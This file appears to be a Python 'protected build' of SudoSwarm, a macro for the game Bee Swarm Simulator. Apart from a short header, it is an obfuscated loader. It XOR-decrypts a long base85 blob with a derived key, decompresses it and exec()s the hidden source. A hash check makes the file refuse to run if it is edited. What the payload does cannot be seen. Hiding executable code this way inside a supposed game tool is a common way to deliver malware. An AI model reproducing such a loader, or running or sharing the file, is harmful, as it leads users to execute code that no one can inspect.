# SudoSwarm Macro (Bee Swarm Simulator) - PROTECTED BUILD
# This file was generated from the original source and is not meant to be edited.
# Editing any part of it will make the macro refuse to start.
# Learn more in README.txt

import base64 as _C8b
import hashlib as _C6h
import os as _C0o
import sys as _C4s
import zlib as _C2z

_C5v = [222, 113, 75, 110, 233, 127, 58, 242, 159, 55, 61, 222, 209, 73, 161, 215, 44, 101, 41, 53, 177, 191, 54, 215, 88, 251, 251, 116, 174, 216, 242, 75, 27, 16, 143, 44, 227, 142, 24, 62, 7, 39, 174, 228, 17, 163, 197, 27]
_C3v = [22, 174, 80, 212, 169, 163, 106, 83, 190, 46, 35, 114, 133, 210, 160, 3, 138, 8, 144, 80, 205, 199, 67, 7, 119, 157, 50, 160, 43, 183, 173, 249, 28, 5, 33, 12, 13, 36, 60, 74, 76, 126, 70, 6, 158, 126, 87, 158]
_C1d = "c164cc57f4c7addc45545e6e679d48ccdb097a06d99312a398d114c70e0077ff"

def _C9r():
    _sa = []
    for _i, _b in enumerate(_C5v + _C3v):
        _sa.append((_b ^ (_i * 37 + 11)) & 0xFF)
    return _C6h.shake_256(bytes(_sa)).digest(96)

_B = (
 "6j%CzcLrkXxx#S`!S7;7D6|(JD~u#P6jbL*jmc12yoR%9h+0F0<e_(6%9V#527wZxB?3TM_i@SXT",
 "~Wk@c#LwJR4b=f7e}_{W*d_r%Jd|f%#IgocK`RL?@J%LB9mFb-CSb8%os&lNzh_&hHQ0dG>?OIL#",
 "G5$?05h*1<XxSSbL;F5B<iZ>6;PX_9BOqaB0w?k%%8Ek8D^`-o}}Dwfk888@#7RXK7lvpYwV0#b^",
 "H=w3wx32q`-Zqg5=@CyKbjf<97JiMMi|JL;&2VS>YH6;fA=UE=lw0@9g~Xkn`t*GHoZZg#j>`u&8",
 ">4P_M#UtM|;4jGD5t^&!Cxl<J?4l^}$_@P{5Gl0@rp>W48ts>uU$a5@;?EEAM^YjY2^}+GCf!8|&",
 "2_))mvzE=W6zjEskMM_UBSptE3vSe#cqDa)V@U4EF|X(Z_MIjt_=L`AJ`zz=(6k(eC%b0{rf!dii",
 "ae22$KlaOOB;lroB&^$4*aW<|6O1r14>vffM>V>F$b?-ggDaO-Pj55$dck}ym{LnHXmpchQLFeSp",
 "+K-Z40@h4eX_82zslV?&D#>(^#9yI-de#LpQSn&!xC<d=6M)GrQ(wlDBrKRxDyf{m(FD%4Uj@06K",
 "!d(V%o?s>jjw5^zB8Hk$}#KK|<1V*B+MX@*MvgkfznKtk*~KFzKs4}uId_@OZR?C<kX1ARCh5)mJ",
 "+Mi$w(mrLKAy^W_w$Jip>C4S%epnPBC+VxjGRg-srWg)ab(H1})U8COThzWFe{UhC!Ex!C^DWs7l",
 "sgAu;D9@)6p)I?V)aqrjRr7V@`Uz8NlcM+GHpgQd6LYh;6c(mxswFQkhtyN;_*vm=SNc8Qsy>q-1",
 "b_ql*Y4KF93s*28+?pZDU709{?yI(im%Qsk5dnKq+JG#3o<zkBkHd#`1aTncbiA(b~=4-bQ=iWbI",
 "yYr!9eVb|M|SvoF_8MbwNrLfxfL+>w^#FJG4!ssny|_s3GP5#^rNk<h~vgqVk?IPe5R+=jAd%C<Z",
 "TerrXSwd^Ya1dn1?q<i1|%Nd_FM2JG?}>wlK@68wFrzeINg*iK{SNL*!MS?UShh6Wf)VTQ7MP4J>",
 "ZqiBBbU>j~LEzLUR?DTljWz4)PtSm{wS#f>9_G8LpBjkFqCRwB!mER$(G&N_uWeT69eS0^K9jqak",
 "wHx}vo%6IxyRsC!E_wtK3!evaU$uz}Q;I{+k?nUP$X~iP_^q=r%kYd5`J-|BS~)bobuvw-riYN}s",
 "cJQDQn~9!e?cafg88X_yRE~jE&H*>_^}{E0$~P{0T6g+mWI5V$my`kN;|H;O1MzoKi<#SnX2qjP}",
 "bwKE(<>Ldn^h8dl1%F>LtqVoG<g56!T(6{kC|>cUq5u8Y1dWvgoNW9rL@94q66}ohgd3JO11WKNu",
 "KMeYyBTe5lQ@PmtNp*Gd!EsQ%!vWaI%~yUlsYVQX~WvSuw3fnMv-GT+N=$~DK6HylYo<KK^?Y7Va",
 "dyK~;yKN;i=B;tdXkYE~J<cH4zLS=&$(X(MTFJipM3p3~EmX5*<Pcgb}aM4)v6#$__65`rJhZ!xA",
 "V^dgb#qVQUFp*FlL;;6W_nQ*Ph>8JW+K3=@uJj0KdZZtS6qsV03U5If;_Tn!fH6{T#ud_fh0nr0X",
 "dDDC4#>j<Xt4SQ*>+z(!5M{y*2eQQcKfHESN5tA!N%wp*;9|0P6|Zsa0Pf<Y@vdqj9|DzQLA`Iu`",
 "wa~aWusCy8BRK2HU&BK~3k!JSHErhASx46%M-~^CK6#`%)*)R43i{XKYZI<N!w34s(13wi}m{`qH",
 "6J%I!FPkDt7;_5_IK6?d5giRh<ie_(_2U395t#j^~#RBJbDOPJHeUECppcaC{n^qHF(@4Tt}VY2y",
 ")t|2(?4?)|v1qNcFj3sWAKcSS&t2Gby0tRDq0{F?_HNlGuooa2T6tMfq0N2chzM*CiJuY_%s1&2~",
 "veOT8A>^^NL6B~MB$4Kq*OkL#&MS^EP&Lb0Z~r-%(tNoLE=L8aB?Dj>o7mb$8I_W-biAdpPo<1*<",
 "LPR)ce`_TDZCh0_gd)5H%{`Ga48vy{k`HY7ur*w-D@8I?nq63ZEdk#<s;FgawSFIP?vl9!fZ{ZO3",
 "A0f)kU7+!VsoqRlc4U0m*3Pv4V_muR_e%51#yK!|HmXO`-N%!1W!k*E{!dxK+!b^HP{3Qdl+9STf",
 "9EPu0-^e+`S*$=q7s)7qDi(>=7@q!&>I@gw-h;)^Jked6DtRVxMtWZpmr+c2idA(6^>1E<ww2|u6",
 "62b+5$L*h$Xed_<b?-deGP&kLRHzSuOq0tgv!j&SfM)-y0k9TrXr`MIKDsAJGp;K>5ictvz6J42k",
 "0@Oo|X;5L~0P|@7-S2FNS`S_ekI;j#pQwr)8Dh<?L5Gn_$rBrw)TTKYb4?q)1-{!QTPw`=pc!1h$",
 "m(P^cAj}#jlTm0xN=h$nBdnBKyra1yv~vWKC9;S<M_#odRnw7#E}@xc0@+iMgD5gfIb^hO|jrVCf",
 "P`}vleoJxV@OnEv%|S=`3_VE#N$OHo3!!MsKgfjg5_{Z0ge6f*drHOS50jn4=}JL%Q=Go)lwCQl-",
 "`1FM`YsWrF^M_>0eVw9n7QQdGYW;@S;;Z$va_%dOou&TM(4u696{)DA>O%etQcm6_F5v_6-;z;Rm",
 "qkYbO(c=aBis4PnkK8;?+o@Fi!lO@)5Zf84!NBBq$@4R)Mt~FYlBf|Y6+Y@|g_(d842T_U~cJR$P",
 "eDQ$J>Fm||z$z`0^jj%iONF4&W4{_ez(7M0T7fGlR#kM;e{@A<{q}V0h*SsMzf3nx_`uP@j{)MLb",
 "3hiT*vOgkgaYqm^tj>Q((I6q-CQ<lh1PXYFV^XcHB$YM1?Bi12fHgM=Up%eO`y=OIIv?9ICI{^kt",
 "q|cXvIrI0VI0H(W)8CpZkiWJW#2U3*uue*_K2OH67F)2!Y88lSl&|s=qG;5U)<0sc3q+Ga|~*W%e",
 ";b9&>pnM-4xjWxwt}%s7D-#+cBpZBoGxgKda(MnQXZoJkIkly|HWa&0A7vDLmd`&)X<l#neKH+-{",
 "q$=Q5lU*H^sgTU||Bx)#)f(aV9v7h^vPd`7n4g2)@R2Ug`Mu7pZDXlGWshPf7;@V~AsO;q2v&|3O",
 "5bco53c}tu;HQWZC`!Q8secS4$D4F7Oezu{+cKgjC$Z4MSf<0_(kx=1Ij+HM!0v__PB3T3yfF!iV",
 "P)KNKOof7a^#iC_ftcmJr*Bd{^{nu@boepX3!gJ{U}Ls3QXZn!&fF<{EX&P43sQtPb6vXXPMh7<C",
 "uZaB`@68AA#+@k|}(Vi<6hSHFg0ZfNd1BB=NRd1yOsPy!Mp)I=N%k%5mDxfxX)5aOMxnEkuw1?iS",
 "&rXhRx?tYEiGS|%@q+Ngrwc0{4uS1uy`ZU#&{=_D0YA)rRCI9d1&+0=95Q=C>0)dI8y^AZr9C_wA",
 "WtA;T*t`Hk`iZA+mhSHuowtv^{LDImNDWfAZ6Un#&8U}O)_k14v*LHS9-$y01H~ee_XV;WoDk@%T",
 "dfqrZu-eTVylzdYs0dQc8_74Cf=~rYH|N#D4=8}<!>5Q3OP>`rAHCA~k^jsLjR6V$N|gn5`?dIgQ",
 ")I<KWE$`0NG3&_a}%~z7if#Ivzax&EC*|LxeYz;_L7N4qYi1`9((6TC(HpP3Zr$qbuoWIrVcfm2M",
 "x2dqu~7*J`a-_J}0%m*?2i+NSJz*KA)(I#<FqAjE2%6^cG4u!IQ{52tG|4g<%=ONnl6BySy>iL8!",
 "?*u_zrs0{rt8Dl6+@oF;PB2eYj91j&i3m~4*Le)nRSF==LlqcSP9MKK?d^?WYoKdaS?r*YdY`kX&",
 "Z2N;fE<<uk1g540$aOP*B%V+DH!)M@VdWn6^tkTrTh`1g;SO55Fugi$@n6e?t!mq}Qf*moQ^cD8%",
 "gefmR**OD_n$7}KE&6i@;qY+;A$vZdnk>haRxxvSleKI~{==A;QP_Tnjj+{yjgJdIl^LXz>>i<f$",
 "*>=_{UzoMSDf&d0!_U{=q^Q$n^5k1{ob#=u%mP|H(Nt(&IMNY!ccb$kpQ3cT=vPCYEX<Jq<Brze@",
 "%5@IU9nUBSs?tJzPHa+u+NaDm9?la@1|1X~Ddgm{EysRVcxxPU_tX+g~=BZ7T|=YYM-Sd_o|y;_n",
 "isLt>(R7SdA}JHHre%&1FliK&4YKy~XV1sM%Z-4qa<XxnC3_E9v@vy(>wDNzFOi`D6`=)iI$gZJ&",
 "2Ozi&y+$P8{WU~4M97O$foQWLGm|srb515hwX=z}v^L6?y=pj=2A61JY4hvCLF{NK^0@PvMpwa@K",
 "I~nZ5P~m{4Vy{Wu`qnM{lP+OLB}yUk2j8oDwQkKyi_AQu6^MEy-ui9I8i^`J*s#RXFrgY3BUSPAz",
 "vtyqp8eTlRW8;nN*}TE1pEv49TMlgNVU4Pc7CW*C5n!9`^alldxD^P@*u`MgWUfE_jr%%P?~wOJ>",
 "$3Oz@wtP?Af=j?hnLAD11=)Q<;aoim^?*l7As)>w-Mf@Fx_k|2-NC_^{D`C_=1IFIoepTyt$}rl|",
 "3S5f)M0yy*sb$gXW6N{wTXN|rcfv;L2L)ig)Lr=hzC^M4QwlFeMpcr`LW6BMkBZjl}gtBUIQ^9nt",
 "5hDERg1ml42;Zl*6F*_`*Q})oma|u24dy^2(>cm<Pu%`a|cgG6>Y+B9|oZn589kjv5I@<z$>tNmo",
 "!1;u250;RIL{5sQ2uqfpy$FsSLj$=UA(`|x{7)~LXY-;0O<?V>(Hg;daPvRP1WhLPf%2|;2sny?B",
 "A(bQasIa?J_R1D4~7Lv#K{G5;z)uMi6&9eDRUyoC2kF<H;_xqs*a9<mp%_*d0dtbg)oX$TE*rO)(",
 "6Yk;iF?Yv;~@P*Y&)$Y!@FP<hbR5pv*tM{r=-XW>}1h9eT$)GL1q{YJdg@VW!?>raoaUwb!oLour",
 "WPXr(nO{*2*+)_2CXCW&rA@IPAhuS3bqC%z>R>y1kprN$deRF0Qi^uN&4k`E9V5wAo8V_EHyBje4",
 "zdokh-gHC;fT1>N&VDF&!Cu5KfoELV1b(_5#_ZcmarDk!DR}ctwK4It!kWaP=mOPbc0`&U-QB92v",
 "v@F_i>?mo)EojR2ex77Tg6i8*it!Ee!9bI%>h3uDlrqw`xjh~y!IjeZUF>=k_FofjqBex!_lxIHM",
 "-LbJh1}B6{_E=kV$5uc7=Ww7NSR_h)U9zm*0WJ8!x4?fG<)J6<N3Qn-zg_saVuEg5^Fsa5(i#M6!",
 "6s$gH^CU<8rFJa>+MnPEkKlz4F8gTcFF?69qK6O|a2LIJsz8l&}~KPVdrn-duvBJW>nUz|TE*2Io",
 "KwPUk7ngJ{>5qw;g@fx_;<WeuzjiZOBm(3VG{_<rhmVDZ2+8ddfMmZ#pJao?>bFj#r9xVuPfXZt?",
 "?ESecT1TpXbmN4MzeAq%RbXqTPf#hPKY$(L~!pBkU7T+l$Vu|4nALy9P`aAb~FeI+^Ysh74!5pSD",
 "Dko&FH(6%@M%+tO8WKa}yUgFkkU^Kgb)Tf4dDhl_H@4PjdRf<jn(QxaZTfy*azcjKVcbd+XprOiH",
 "XnV^RJl)z5N*oU(BVb$2dI8RmdEQr69At>2IQ-!@OK&~D=V98$rxq{$<e3DSc@kN(~lskz588G0Q",
 "{?UuGDgdv_*2`YN$q$b6=MQ9+0c{mG9-&GMQuSHp?F5DO*lj53mcUWZ-iK>G4Ynf?Z~w*9DpCd9%",
 "NZR;LTq$js!XgAO)Z7u83BHOIb)XWeEGY{?YW3^HaMvvB>PCVd|MtcwnFQ7O%N%mkXALU8|Sp_K;",
 "jS|qz5^JFP;&wGeST2eEeLZNV7#Om+$P_~pElcCg{7&B;z)56S89WHYIBP6tz51o8Wo67PsRPVu^",
 "3cQ^E70hIe#OmT`$z46oOTw~_!P{$Es1m#B*<)471>G0pt1+be)Js+KDMc%;HcNDRdK|wv;3WHZK",
 "Z4whBlX#tM!g7m7r<`iPj%Z`9^xp8N{S4;V%zU$NufTd;Z@D$M<||s?1y#r3tiv+&Nk^{wA1M}ag",
 "x4=Z52=g5RcUv%V1bc%%!F`W242Jx&1-_cC?)YIO|O#)W%r<;{x1G{3gjL<W1vB&qx5NB)SHX#Ki",
 "1}0rC7!OnPGyPcjSVAKL4cZ4_PDx6}g|_8G<c1<v()Y36R<e!?*%)-5KZsXm5^gwXf>1Rtpw5}7t",
 "|0B`%DJ9zvGHgf=!@5DJH&qxp(ao)k#+`!Sk{O0$3U-ib!zbvv)?zOAE;|&LECfCDwDp!(d_z6s}",
 "N6iP;x}No07{GufbUH0?q?+>0r74kj=-r|sklcWiEFLa!QaqCGpu|4?bi&wn!`&E|3PGp*3^sK<3",
 "Qesm_?$G9UbjsTUJp~*)Zny}o8tK2dPn5#CD#4in*UANtE3Il7k#r%3g0<Sz!%e<uN_Q2;4;;67V",
 "^LO4!$p>me9+6j~$-!kiu~5#p!EpW9{jQ(QP*MgGv8wf0+5-3KXE;n)+gKNl-mb8-~#}GhUK)*mb",
 "OyNh?zwM<4@fPxA1{n~9jd1cR7;rrn<~y-hoF^;pK0dMhs#EtAb1A4q5%L~Vuln%1)wKN#-&3t*=",
 "XIX$F0@WIbxroZA2H8zbQo-PQp%-94g2V+Z)<2sr2MS>1d%D|BkhuEc@ic*dSnHU(93mA-$Jv&R!",
 "a}d|P)^ijY#4G<eeDkpjq76JQ<=$@i_-fePcEOF$Z=~_*;2MQBjosVJP+0x@mVxVC@fn#n+mKAHd",
 "paTt_z|>E(2uKYrp31iLB?K-7c(tp9517#GBaYsWdYUw4v+@1!cPp&gYIHWuH0BJBBx+Ii&o2{NR",
 ")h2^UKH>3;jouyJL%1dq^7sX%%xG*Nl2TJ3yvz@s&wiW%w)l=NwG3is-ypwkK6rtLoIWTV@WZD`4",
 "e=fBI&O$JR5t#Nm<N;|o5dM)|n@VUwlXRq~|P9^Pk-)B!D6{za-7wu;*QbtSWA#xc&O{gWLYtC^*",
 "|a6T3A;EP5Amp1+fG-6`ncNI14t-*uO8E`W+(25RT1qO3O9yw;6$=|TEqKnPf^XaZZFV>Smvz}Rq",
 "9%svCM|;;Wc4V0i!Y6^?nq79Eapt?c#YKPDqyGTO?k*nSJyqvW=lpfi@%blmSEu8q*@m9;AHMq6?",
 "mB{BO_2<f4{LO05FpQ=g(?Aqh6K;P9*ix{OQ8l&7$>W!LsQx(p*%h(sY=21&odRE-x4fdgoPGi$m",
 "*6}UU?*-IjL@VrxUJa)nFy61sSuMxrVbk@lO~xXWf^>CRvCjzjw-kO(7N{N<`ATZWG*PSspgON8$",
 "r9u8Xaxz3z=AUW=e1;c=tv*zVcBsFIMRccTnv<jTdo3P!>gHaZw^ON0<jqw^orUJ5D3n8Bc)E;Uh",
 "ftatvYQLX*AY`K+?W~Mq%+=oar8JOSbY*@(xb$~1~cQMYZn5uRip$6zCRWQeU+eB{8B1kixZ>e*M",
 "Z&%3=LqB^i2z#f;OupZJxxiR;)Y|MbmLx=JO?$_#h1x7s&M9_sBBC6G`eey6XxABoeJb2scaa3~S",
 "@i#wNMzRp#4|)?D|cl0?q1nlD1Xj<IHTRyvpu@S{*X>@T_FL_Iw(l7U;5E{Jd>SaA|t#Xev1=8%I",
 "$>=1ZabX`pmrASeoEZ+qLOjBGp$<Z1qh-7K6zG+<A9W<YPHSax8G$->>6I#yazmb*h5s@T8vYARC",
 "SXEWjEuF8kPc8BSZe%`5Uek|Tir@L^Ki!&}EIK|q*2i~nCv9Q}*6%!SZQ7tQwunyv6CTYp}JQ>cX",
 "8i^zDwsrobZu2{;_C0A6Qp08X0#z6(+?-E&l@zr=IkRO-3{J}Hdp)%g$%&j-F@CXmVo0xV&8$tW{",
 "Rmtyofue*lWJNMv!S|fTa_ebYT8<uVXmD#|noFLfo%95CEf87-iQ4dGM>WknzLboEYSoO>Y1R4*r",
 "w6YvW<yB!#tkhindn7$Gq{IeEKJ+obx`4AEPd9c9aPnda3r|)CAGz{CvD9kF9sULiD-J3D^fV3n$",
 "}mFV1bGnYXE+o_(mX2uE8v4+_j{{8=>Sujm{mEof~AqPZ5FfxLQ-bWp*8FnmM?yAV9=;H+oMV=LH",
 "gYQKa?N-eTo23C<~NL|rBK(J=k}+5M<sCgb{Ov%y>YKV8pTwISyb+EGsC&{n@pWn*uB<zL(^n<+C",
 "4R&qp<HwQ{bBeL?)_j&BW>y1^Q6c*kKTU#VwaOT&e+TEBmVY%!7A~?3@Fd(o6@urJ9p<MVTjHWT7",
 "6K4tZ`D@x+CL-oJT9$21<x0Jwj4uqw(lu61|BFz_3T<-ljymLFuK>=I4;XZAP>)mv8e(=&0{P|A8",
 "7!L}5(u<TF7#CE9cE^B_27F(GR7&YlAtvs=+c>i@n;Hef6i6*ZFf%TY<u#i@L1IbzH?dxtOzyWDx",
 "zYMpomNHLr1f?Tlr@0XcN3BTDY3FIi>rD#b7D+_$>xIPNtZ|hRp1)w{}pBm;eVYr{vASTFcR&Q;6",
 "f&{O8sLRAEI^0m8&)lkF346_45Fc>GWFmcI=i;R%i7sl=^`GD%e;JWRpDc<?J+F6*Z(yI|Fl=46=",
 "D&?g`0W{I>WuSXSjuFKJfz%OxhVkA_VQm*f{cqUp>o%U<U*+S!GtnsQV_B%^b;BiOB(fRRS-CU02",
 "NB1Lsk9|Y{bz%34%O#(tSFYZ)&~?}L%*00jVg^eH+`^VfL>9L@XHZKgcM6&ANWl1~1w=*5>*=Bt5",
 "F=ZiKFl|35@t??p!P9Vu}`P-hSBRw7a>wesf#zfz6le5F0Zt7)Ho@d)vDWC-*W-Mo3tD*Yo79W$)",
 "TbcVvubklgP^EA})QfMEpOeZW-QhsXa;(XZH}FTX9xgWlRkj#L@5aVvw9Vj=g#=#6iu^?r6;JT4|",
 "v<9rxOelM%Q>$CG|wv3C&oOg?gVTQh0=7g$l>xME!V4h8Cd_L0{bf<ZB$k%o2F=Pe$NeY8SI=D>f",
 "}Bz$CQd=2@zs<rhK^e~{x!o6#}OOk%P4S&q1su=&m0;2FvNF?};=BD3iyQ3kLZ}$5KU<TU#Xw;c%",
 "$S$B|Zm3v-tj2S#{yNBbXr#t4>Yg=H^M?A)sJSZFuvatvEQS*H!|&kuan_B70t73Kq@ip#V5Q)~A",
 "}cIIl{XZAlcVs9EZ!p|^yKI8GA(YC_7JUAS8hs-3aUu=L%sfMP;7rrcLc=dr-k_@kh!#@AA)5}HX",
 "FHte&j;V+fLSKF`sVn7E&C&s*7?)DPiy1;e@wDp{X<j;sQ)Gneo~hh;Oldr*LG~*au@|dBc5w)<O",
 "IN=4@iKHTVEUp++e7#ec#o0XP|LuO<_E7J^M!r`P(~k6LgkZ$=d?PG)d6H`k_6N_UCLGih3aF)h@",
 "D9Nw>HC*A~f3Fp0<s;c*8b9>c^L7A|LTTYZTzgoWp1j^PPO;BkIk)H1OEk^Kjn7FAKT#C-_(FU_C",
 "r{6uP&+HO4sOik{ZabosaTWTCq27AbP3PlY4kxUS$NEnhnHZhL`Gz(3gciNrNz>!@`i3NWR&M&5&",
 "cxhwRs7QQ#sqi$gYq9Ny4v1F8+j&k=3;5l&}aswoFq>`OeT@$nLN*V?Hmnl5Qi}N@B5f_cy-08!w",
 "1alFlK&}G<aRZMZUdL%E;g)i?=w!fl7=phqI5w9(~~f3Dda6#?$ff1xhVuDu4K%LjG+vM$X(%ND=",
 "^H7`pqtOXFW%k&Mg!w8Sl<yR`>7*bM_SeTG;qi#D*=x_!+2)+17I^7cQ(dg^Hr2<ymM6Fj-F9Ul?",
 "DC0*w5q}Jl8a{<`R$Cg?$6_hsPs6P`Z?fL?uR7$2ut8tvY#(Da`8wdYL=p7`tu(FNU2`GqFz^^Zh",
 "6Pysr!tQtJU{Y)nn&-N5+&gcC!-seqffh7a9=RM8O==tOVoRk=NvMt9=8aSZ_-y-(N#?NJr)jj>2",
 "GQ#ra#6Qmm!}Ff;`i~Mfm_xhz6Mmpy@%f!3fA+#BRaEdVgSa$WwNI0LdvOsC;~MS83T)0w6ZFm)u",
 "XEIpm0ZIel4{c*8)u1w!WYPbG<Q-U_{PKdHgPVd)yM$60DWn<SsDR^5SVWm|v7?H4HQqU2GPKTk9",
 "nS%n+ELupc-Ya=eT_KliiA$(t#~PhM3B_8EAX@vWVdieEe-d>CP(rW%vWX+aiWQVld}!?HRBa4W%",
 "O<ewCd<?ZMZfpnG(ZFVtJ$zoPfK^-r((bH((k=Mc2J+x<CiOBxKG?Eipn?)tRj9OqGfA;9jF44|w",
 ";&P9e;Siq5j9)=n5dy7UP$AY{>wb>=+iXX2EX26UUs8S-e3QxKM6HcLK~`u~p$2y+4C<Y1E_-!-m",
 "Z4yeD)!vJ$GvCFQ>B@guodHIk}vi40qDGA%k0pL5_fI2)ktW2N;c+$(@->HmlG>&2PLt8_i`Txo0",
 "pqV$0Y0toWFJtI5Dyu4Bu%51_2_Neg~vHCQgjt3eDYq%MvLclp11Ra7H5KVyUF&i<^RHJ&{vt$0t",
 "D$x1I35AVeC3yHA8259MmI!!d31J0;B)kd{03?$<=j5LIM@pluGuF$pFJel$umy8#c+Sg`}RE)VU",
 "LBF`KEY<3Au_#6~=Za_P%u@I_(T^^)yuX(BLtR5d}9XSmU9(sQH#gpFM@$*u^@X_f&)||_>Y>DRT",
 "5>k@#B(g;f$H~&^&qO#gECf_uz9@Fket`KSP9qt$+IBEq3_v*@+_1u6$U(NwH0bpv2-v}lqJxC!l",
 "F_Yprwf|SpGm7?pctJ(YAN*&ZgK"
)

def _C4e():
    try:
        _k = _C9r()
        _raw = _C8b.b85decode(''.join(_B))
        _src = _C2z.decompress(bytes((
            _b ^ _k[_i % len(_k)] for _i, _b in enumerate(_raw)
        )))
        if _C6h.sha256(_src).hexdigest() != _C1d:
            raise ValueError('integrity check failed')
        return _src
    except Exception:
        if _C0o.environ.get('SUDOSWARM_VERIFY') == '1':
            raise
        print("[SUDOSWARM] This copy of the macro is corrupted or was edited.")
        print("[SUDOSWARM] Download the original file again; do not modify it.")
        _C4s.exit(1)

_src = _C4e()

if _C0o.environ.get('SUDOSWARM_VERIFY') == '1':
    print("[SUDOSWARM] build check OK:", _C6h.sha256(_src).hexdigest())
    _C4s.exit(0)

_pr = compile(_src, '<sudoswarm>', 'exec')
globals().update({'__name__': '__main__', '__file__': __file__})
exec(_pr, globals())
